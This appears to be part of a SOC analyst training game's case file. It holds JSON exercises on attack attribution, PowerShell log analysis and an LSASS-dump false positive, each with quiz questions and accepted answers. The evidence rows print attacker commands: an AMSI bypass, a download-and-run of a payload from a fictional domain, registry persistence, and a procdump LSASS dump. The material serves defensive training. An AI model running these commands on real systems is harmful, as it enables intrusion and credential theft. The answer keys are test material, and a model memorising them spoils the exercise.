+ "timelineKey":["09:44","09:51","10:02"],
+ "hints":["A hit on one indicator is a lead, not a verdict. Weigh execution and persistence evidence above a single DNS query.","Three of the new hits have innocent explanations: a SOC-owned lab machine, a user who clicked but did not execute, and an unrelated product that happens to share a name."],
+ "review":"Confirmed scope is three hosts. SRV-FILE02 is the important discovery: the file hash missed it because the operator deployed a rebuilt binary (nwsync.exe in C:\\ProgramData, different SHA256), but the campaign-specific mutex and the NorthSync user-agent matched - exactly the durability argument from the triage report. SOC-ANALYST-VM01 matched because the SOC detonated the sample there; excluding your own tooling from scope is a routine discipline. WKS-2019 matched a substring against an unrelated analytics SaaS, the classic over-broad indicator problem. WKS-2077 resolved the domain once from chrome.exe with no execution - exposed, worth monitoring, not compromised.",
+ "next":"You have three compromised hosts and a coherent indicator set. Before Tier 2 builds the response plan, the threat intelligence function wants your assessment of who is behind this and what they normally do next."
+},
+{
+ "id":14,"title":"Threat Intelligence","domain":"CTI","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Threat intelligence has three layers. Tactical intelligence is indicators - hashes, domains, IPs - useful immediately and short-lived. Operational intelligence is tradecraft: the tools, techniques and sequencing a group uses. Strategic intelligence is targeting and motive. Attribution is a confidence judgement, never a certainty, and is expressed in language that reflects that.",
+  "why":"Knowing what an actor normally does next turns reactive containment into anticipation. If the group historically deploys ransomware on day four, day three is not the time for a leisurely change-approval process.",
+  "look":["Overlap of infrastructure, tooling and tradecraft across incidents, not a single shared IP","Targeting patterns: sector, geography, company size","Typical dwell time and the ordering of stages","Known handoff behaviour - initial access brokers selling to ransomware affiliates"],
+  "fp":["Shared hosting, commodity malware and public tooling are used by many unrelated actors","Actor names differ between vendors; the same group may carry four names"],
+  "tips":["State confidence explicitly: low, moderate, high - and say what would change your mind.","Use intelligence to prioritise, never to skip evidence you have not actually collected."]
+ },
+ "case":{"id":"SOC-2026-00590","severity":"HIGH","alert":"Attribution and predictive assessment requested by Incident Manager","host":"N/A - assessment","time":"2026-03-04 13:00 UTC","source":"CTI platform / internal history","brief":"Assess which known actor this activity most closely matches, with a confidence level, and state what the SOC should expect next. Your assessment drives whether this incident goes to the crisis process."},
+ "mitre":"Multiple - see profile",
+ "evidence":[
+  {"name":"Observed Tradecraft (this incident)","rows":[
+   "Initial access: spearphishing, password-protected ZIP containing .lnk, look-alike partner domain",
+   "Execution: PowerShell downloader -> UPX-packed loader in %TEMP%",
+   "Persistence: HKCU Run value; Linux cron entry",
+   "C2: HTTPS POST /gate.php, 600s +/- 12s jitter, user-agent NorthSync/2.1, self-signed certificate",
+   "Credential access: NTLM brute force against a service account from external infrastructure",
+   "Targets touched: logistics workstations, production Linux API server, finance file server"
+  ]},
+  {"name":"CTI Actor Profiles","rows":[
+   "TA-4411 (aka STORMPETREL): financially motivated, targets logistics and freight in South and Central Asia. TTPs: partner-impersonation phishing with .lnk in encrypted archives, custom UPX loader, /gate.php C2 with branded user-agents, NTLM brute force on service accounts. Typical dwell 4-7 days, then data theft followed by extortion. 3 prior incidents share the NorthSync user-agent.",
+   "TA-2290 (aka GLASSHOUR): espionage, targets government and defence in Europe. TTPs: zero-day exploitation of edge devices, in-memory implants only, no persistence on disk, DNS-over-HTTPS C2. No phishing observed.",
+   "TA-8801 (aka REDSILT): hacktivist, targets media. TTPs: web defacement, credential stuffing from public dumps, no custom malware.",
+   "Commodity infostealer crews: opportunistic, broad phishing, off-the-shelf loaders, no follow-on human operator."
+  ]},
+  {"name":"Incident-Specific Signals","rows":[
+   "Operator activity is human-driven and interactive (manual sudo commands, directory enumeration), not fully automated",
+   "Second-stage binary rebuilt with a different hash but identical mutex - indicates active development during the intrusion",
+   "DNS tunnelling from the finance file server began 2 hours after that host was reached",
+   "No encryption or destructive activity observed as of 13:00 on day 1"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which actor profile best matches the observed tradecraft?","type":"exact","accept":["ta-4411","4411","stormpetrel"],"hint":"Compare initial access, C2 style and targeting sector against each profile."},
+  {"id":"q2","label":"Which single technical artefact links this incident to prior incidents by that actor?","type":"keywords","accept":["user-agent","useragent","northsync"],"hint":"One profile explicitly names an artefact shared with three prior incidents."},
+  {"id":"q3","label":"What is the actor's assessed motivation?","type":"choice","options":["Financially motivated (data theft and extortion)","Espionage","Hacktivism","Unknown"],"accept":["financially motivated (data theft and extortion)"],"hint":"Read the first line of the matching profile."},
+  {"id":"q4","label":"Based on the profile, what should the SOC expect next?","type":"keywords","accept":["exfiltration","data theft","extortion","ransom","steal","staging"],"hint":"The profile states the typical sequence after dwell time."},
+  {"id":"q5","label":"Why can TA-2290 be ruled out?","type":"keywords","accept":["no phishing","espionage","in-memory","no persistence","edge","different sector","government","zero-day","doh"],"hint":"Compare the persistence and access methods - two profiles are almost opposites."},
+  {"id":"q6","label":"What confidence level is appropriate for this attribution?","type":"choice","options":["Low confidence","Moderate confidence","High confidence","Confirmed - no uncertainty"],"accept":["high confidence"],"hint":"Multiple independent overlaps - tooling, user-agent, sector, tradecraft - but attribution is never 'confirmed'."},
+  {"id":"q7","label":"Given the typical dwell time, how urgent is containment?","type":"keywords","accept":["immediate","urgent","now","hours","asap","same day","high"],"hint":"Compare the profile's 4-7 day dwell with the fact that you are on day 1 and exfiltration has already started."}
+ ],
+ "decision":"needs_escalation","severity_answer":"CRITICAL",
+ "recommend":{"any":["escalate","crisis","incident manager","major incident","accelerate","containment","brief"],"text":"Escalate to Incident Manager as a major incident with high-confidence TA-4411 attribution, accelerate containment ahead of the expected exfiltration/extortion stage, and brief legal and executive stakeholders."},
+ "timelineKey":[],
+ "hints":["Attribution is comparison. Line up initial access, persistence style, C2 pattern and target sector against each profile and discard the ones that contradict what you observed.","Intelligence is only useful if it changes a decision. Ask what the profile says happens after the dwell period, then ask what day of the intrusion you are on."],
+ "review":"TA-4411 (STORMPETREL) matches on every axis: partner-impersonation phishing with an encrypted archive and .lnk, UPX-packed loader, /gate.php C2 with a branded user-agent, NTLM brute force against a service account, and logistics sector targeting in the right region. The NorthSync/2.1 user-agent appearing in three prior incidents is the strongest single link. GLASSHOUR is excluded because it uses no phishing and leaves nothing on disk; REDSILT has no custom malware at all; commodity crews do not feature a human operator typing sudo commands. High confidence is appropriate - multiple independent overlaps - but the assessment should still name what would change it. The decision that matters is escalation: this actor steals and extorts after four to seven days, DNS tunnelling from the finance server is already running, and you are on day one.",
+ "next":"The incident is now formally escalated. Tier 2 wants the execution layer pulled apart: PowerShell script block logs from WKS-2041 have been recovered, including the decoded command the loader used."
+},
+{
+ "id":15,"title":"PowerShell Investigation","domain":"Windows","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"PowerShell is the attacker's preferred execution layer on Windows because it is present, signed and powerful. Defenders get three logging channels: module logging (4103), script block logging (4104, which records the actual code after de-obfuscation), and transcription. Event 4104 is the single most valuable Windows log for execution analysis.",
+  "why":"Encoded commands are unreadable in 4688 command lines but appear in plain text in 4104. Knowing to look there is the difference between 'something ran' and 'here is exactly what it did'.",
+  "look":["-EncodedCommand / -enc with a base64 blob, -w hidden, -nop, -ExecutionPolicy Bypass","Download cradles: Invoke-WebRequest, iwr, DownloadString, Net.WebClient, Invoke-RestMethod","In-memory execution: IEX, Invoke-Expression, [Reflection.Assembly]::Load, FromBase64String","Concatenation and string reversal used to break signatures","AMSI bypass attempts and event log clearing"],
+  "fp":["Administrators and deployment tooling use Bypass and encoded commands legitimately - check the parent process and the user","Monitoring scripts issue web requests constantly"],
+  "tips":["Base64 in PowerShell is UTF-16LE; every second byte is a null, which is why decoded text can look spaced out.","4104 captures code even when it never touches disk, which is precisely the point of fileless attacks."]
+ },
+ "case":{"id":"SOC-2026-00602","severity":"HIGH","alert":"Script block logging captured obfuscated PowerShell execution","host":"WKS-2041","time":"2026-03-04 08:29 UTC","source":"Windows PowerShell/Operational","brief":"Analyse the recovered script block logs. Determine what the script actually did, what it disabled, and whether anything beyond the known loader was executed."},
+ "mitre":"T1059.001 - PowerShell / T1562.001 - Impair Defenses",
+ "evidence":[
+  {"name":"Event 4104 Script Blocks - WKS-2041","rows":[
+   "08:29:03 ScriptBlockID=1/3 Text: $ProgressPreference='SilentlyContinue'; $e=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils'); $f=$e.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)",
+   "08:29:04 ScriptBlockID=2/3 Text: iwr 'http://cdn-sync-delivery.net/mf.dat' -OutFile \"$env:TEMP\\svchost32.exe\" -UseBasicParsing",
+   "08:29:06 ScriptBlockID=3/3 Text: Start-Process \"$env:TEMP\\svchost32.exe\"; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinUpdateSvc' -Value \"$env:TEMP\\svchost32.exe\" -PropertyType String -Force",
+   "08:36:20 ScriptBlockID=1/1 Text: Get-ChildItem -Path '\\\\SRV-FILE02\\Finance$' -Recurse -Include *.xlsx,*.pdf | Select-Object FullName,Length | Out-File $env:TEMP\\i.txt",
+   "08:44:02 ScriptBlockID=1/1 Text: Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select LogName,RecordCount",
+   "09:12:41 ScriptBlockID=1/1 Text: Get-Process | Where-Object {$_.Company -like '*Crowd*' -or $_.Company -like '*Sentinel*' -or $_.Company -like '*Defender*'}",
+   "10:05:00 ScriptBlockID=1/1 Text: Get-ADUser -Filter * -Properties MemberOf | Where-Object {$_.MemberOf -like '*Domain Admins*'}"
+  ]},
+  {"name":"Process Context","rows":[
+   "08:29:03 powershell.exe pid=6640 parent=cmd.exe pid=6612 parent=explorer.exe user=k.rahman",
+   "4688: powershell.exe -w hidden -c (encoded command length 412 bytes) user=k.rahman integrity=Medium",
+   "No 4104 events exist for WKS-2041 before 2026-03-04 - script block logging was enabled estate-wide on 2026-02-10"
+  ]},
+  {"name":"Baseline Comparison","rows":[
+   "Legitimate admin scripts on this host historically run as adm.* accounts from parent = ccmexec.exe or explorer.exe with signed .ps1 files",
+   "k.rahman is a Logistics user with no scripting role; expected PowerShell usage: none"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"What security control does the first script block attempt to disable?","type":"keywords","accept":["amsi","antimalware scan interface"],"hint":"Read the concatenated type name in block 1 - the string is split deliberately to evade detection."},
+  {"id":"q2","label":"Why is the type name split with a plus sign?","type":"keywords","accept":["evade","detection","signature","string","obfuscat","avoid","bypass","hide"],"hint":"Consider how a signature-based detection matches on literal strings."},
+  {"id":"q3","label":"Which cmdlet downloads the payload?","type":"keywords","accept":["iwr","invoke-webrequest"],"hint":"Block 2 contains a short alias for a download cmdlet."},
+  {"id":"q4","label":"At 08:36 the attacker enumerated a network share. Which one?","type":"keywords","accept":["srv-file02","finance$","finance"],"hint":"Read the -Path argument of Get-ChildItem."},
+  {"id":"q5","label":"What was the attacker looking for on that share?","type":"keywords","accept":["xlsx","pdf","documents","spreadsheets","files","finance"],"hint":"The -Include filter names the file extensions."},
+  {"id":"q6","label":"What is the purpose of the 09:12 script block?","type":"choice","options":["Identifying installed EDR/AV products","Listing running services for performance","Checking disk space","Enumerating printers"],"accept":["identifying installed edr/av products"],"hint":"Look at the company names being filtered for."},
+  {"id":"q7","label":"What did the attacker enumerate at 10:05?","type":"keywords","accept":["domain admins","privileged","ad users","admins"],"hint":"Read the Get-ADUser filter."},
+  {"id":"q8","label":"Does the parent chain (explorer.exe -> cmd.exe -> powershell.exe) suggest user-initiated execution? (yes/no)","type":"exact","accept":["yes"],"hint":"Compare with the baseline: legitimate scripts here have a management-tool parent."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["isolate","contain","block","constrained","applocker","credential","reset","hunt"],"text":"Keep WKS-2041 isolated, treat the finance share enumeration as pre-exfiltration reconnaissance, hunt for the same AMSI bypass pattern estate-wide, and enforce Constrained Language Mode and script signing for non-admin users."},
+ "timelineKey":["08:29:03","08:36:20","09:12:41","10:05:00"],
+ "hints":["Script block logging shows the code after de-obfuscation. Read each block as an attacker sentence: disable defences, fetch payload, persist, look around.","Four of these blocks happen well after the initial infection. They are not the loader - they are a human operator exploring the network."],
+ "review":"Three blocks at 08:29 are the loader chain: an AMSI bypass (the type name split with string concatenation specifically to defeat signature matching), an Invoke-WebRequest download, then execution plus the HKCU Run persistence you already found. The later blocks are far more serious because they are interactive operator activity: enumerating spreadsheets and PDFs on the finance share at 08:36 (pre-exfiltration targeting, which explains why SRV-FILE02 was hit next), checking which event logs hold records at 08:44, fingerprinting installed EDR vendors at 09:12, and listing Domain Admins at 10:05. A Logistics user with no scripting role running any of this is conclusive.",
+ "next":"The operator is enumerating and evading. To distinguish their activity from normal system behaviour, you need to be able to read process trees properly - and the next alert on the queue is going to look far worse than it is."
+},
+{
+ "id":16,"title":"Process Analysis","domain":"Endpoint","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Every Windows process has an expected parent, an expected path, an expected user and an expected frequency. Process analysis compares observed trees against that baseline. Attackers abuse legitimate signed binaries - living off the land - so the binary name alone tells you almost nothing; the relationship does.",
+  "why":"Both the intrusion and the IT department will spawn PowerShell, WMI and rundll32. Separating them correctly is the highest-frequency judgement a SOC analyst makes.",
+  "look":["Impossible parents: winword.exe -> powershell.exe, w3wp.exe -> cmd.exe, services.exe -> unsigned binary","System binaries running from the wrong directory","lsass.exe being opened for read by anything that is not a known security product","rundll32, regsvr32, mshta, certutil used to execute or download","Correct process names running under the wrong user or integrity level"],
+  "fp":["Management agents, remote support tools, backup software and printer drivers produce alarming-looking trees legitimately","Vulnerability scanners with credentialed access spawn WMI and PowerShell across the estate"],
+  "tips":["Check the signer and the full path before reacting to a process name.","When behaviour appears identically on many hosts at the same moment, look for the management server."]
+ },
+ "case":{"id":"SOC-2026-00611","severity":"HIGH","alert":"EDR: credential-access behaviour - LSASS handle opened by non-standard process","host":"SRV-APP03","time":"2026-03-04 14:02 UTC","source":"NW-EDR","brief":"A high-severity credential-access detection fired on an application server during an active incident. Determine whether this is the intrusion spreading or something else, and be prepared to defend your conclusion to the incident manager."},
+ "mitre":"T1003.001 - OS Credential Dumping: LSASS Memory (candidate)",
+ "evidence":[
+  {"name":"EDR Detection Detail - SRV-APP03","rows":[
+   "14:02:11 proc=procdump64.exe pid=7712 parent=cmd.exe pid=7690 user=adm.tovar action=process_access target=lsass.exe access=PROCESS_VM_READ|PROCESS_QUERY_INFORMATION",
+   "14:02:11 proc=procdump64.exe path=C:\\Tools\\Sysinternals\\procdump64.exe signer=\"Microsoft Corporation\" valid=true",
+   "14:02:12 proc=procdump64.exe cmd=\"procdump64.exe -accepteula -ma 812 C:\\Tools\\dumps\\app03-lsass.dmp\"",
+   "14:02:40 proc=procdump64.exe action=file_write path=C:\\Tools\\dumps\\app03-lsass.dmp size=142MB",
+   "14:03:02 proc=explorer.exe user=adm.tovar action=file_open path=C:\\Tools\\dumps\\app03-lsass.dmp",
+   "14:05:00 no network egress from SRV-APP03 to external addresses in the preceding or following hour",
+   "13:58:04 EventID=4624 Account=adm.tovar LogonType=10 SourceIP=10.20.4.88 Status=Success (RDP from IT support workstation)"
+  ]},
+  {"name":"Context","rows":[
+   "adm.tovar = Senior Infrastructure Engineer, authorised administrator of SRV-APP03, MFA satisfied at 13:57",
+   "INC-20449 (IT service desk, opened 13:40): 'SRV-APP03 lsass.exe consuming 90% CPU, application timeouts - vendor requests a memory dump for analysis'",
+   "C:\\Tools\\Sysinternals\\ present since 2024, standard engineering toolset, allowlisted",
+   "Dump destination C:\\Tools\\dumps is local; no copy, upload or archive operation observed on the file"
+  ]},
+  {"name":"Comparison - Known Attacker Behaviour This Incident","rows":[
+   "Attacker source addresses: 203.0.113.55, 198.51.100.22, 91.203.5.12 - none present in SRV-APP03 telemetry",
+   "Attacker persistence artefacts (Run key WinUpdateSvc, mutex NWSYNC_9F21, /tmp/.sysupd): not present on SRV-APP03",
+   "Attacker tooling is unsigned and runs from %TEMP% or %PROGRAMDATA%, not from an allowlisted tools directory",
+   "Attacker operates 02:00-10:00 UTC from external addresses; this activity is 14:02 from an internal RDP session with MFA"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which process accessed LSASS?","type":"exact","accept":["procdump64.exe","procdump64","procdump"],"hint":"Read the proc field on the process_access event."},
+  {"id":"q2","label":"Is that binary signed and from an expected path? (yes/no)","type":"exact","accept":["yes"],"hint":"Check the signer and path line."},
+  {"id":"q3","label":"Which ticket explains the activity?","type":"exact","accept":["inc-20449","20449"],"hint":"The service desk record in the context panel."},
+  {"id":"q4","label":"Which account performed it, and was it authorised? (name the account)","type":"exact","accept":["adm.tovar","tovar"],"hint":"The user field, cross-referenced with the context panel."},
+  {"id":"q5","label":"Was the dump file exfiltrated? (yes/no)","type":"exact","accept":["no"],"hint":"Look for any copy, upload or external egress after the file was written."},
+  {"id":"q6","label":"Name one attacker artefact from this incident that is absent on this host","type":"keywords","accept":["run key","winupdatesvc","mutex","nwsync",".sysupd","91.203.5.12","203.0.113.55","198.51.100.22","unsigned"],"hint":"The comparison panel lists four categories of absent evidence."},
+  {"id":"q7","label":"Correct verdict for this alert","type":"choice","options":["True Positive - credential dumping by the intruder","False Positive - authorised administrative activity","Insufficient evidence"],"accept":["false positive - authorised administrative activity"],"hint":"Signed tool, allowlisted path, authorised admin, MFA, matching ticket, no egress, no attacker artefacts."}
+ ],
+ "decision":"false_positive","severity_answer":"LOW",
+ "recommend":{"any":["close","document","monitor","tune","policy","secure","restrict","handle"],"text":"Close as a False Positive against INC-20449, require the dump file to be secured and deleted after vendor analysis, and tune the rule to account for signed Sysinternals tooling run by admin accounts from the allowlisted path with a matching ticket."},
+ "timelineKey":["13:58:04","14:02:11","14:02:40"],
+ "hints":["LSASS access is genuinely one of the highest-value detections in Windows - which is exactly why you must check who did it, with what binary, from where, and whether a ticket exists before escalating.","Compare this host against the attacker profile you have built over the last six cases. Ask what is missing, not only what is present."],
+ "review":"This is a False Positive, and getting there under incident pressure is the skill being tested. The behaviour is real credential-access behaviour - procdump reading LSASS memory - but every contextual signal contradicts intrusion: the binary is Microsoft-signed from an allowlisted engineering path, the account is an authorised administrator who satisfied MFA four minutes earlier over internal RDP, ticket INC-20449 requested the dump 22 minutes before it happened, the dump stayed local, and none of the attacker's addresses, persistence artefacts or unsigned tooling exist on the host. The residual risk is worth documenting anyway: a 142 MB LSASS dump sitting on disk is a credential store, and it should be secured and deleted. During a live incident, the pressure to escalate everything is the thing to resist.",
+ "next":"With the noise resolved, attention returns to the confirmed hosts. The operator has been quiet for two hours - which usually means persistence is already in place somewhere you have not looked. Hunt for it."
+}
+]
